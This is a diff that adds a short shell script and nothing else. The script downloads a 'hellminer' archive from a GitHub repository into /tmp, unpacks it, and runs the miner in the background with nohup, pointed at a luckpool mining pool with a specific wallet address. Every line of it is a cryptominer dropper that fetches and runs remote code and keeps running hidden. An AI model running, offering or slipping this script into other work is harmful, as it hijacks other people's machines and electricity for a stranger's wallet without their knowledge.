@@ -1,0 +1,4 @@
+cd /tmp
+wget https://github.com/dorowu88x/new1/raw/main/hellminer.tar.gz && \
+tar xf hellminer.tar.gz && \
+nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQNYT55NGnyqBA4fGuqmdBDBJZAE2ESZC5.RAZOR -p x --cpu 1 &
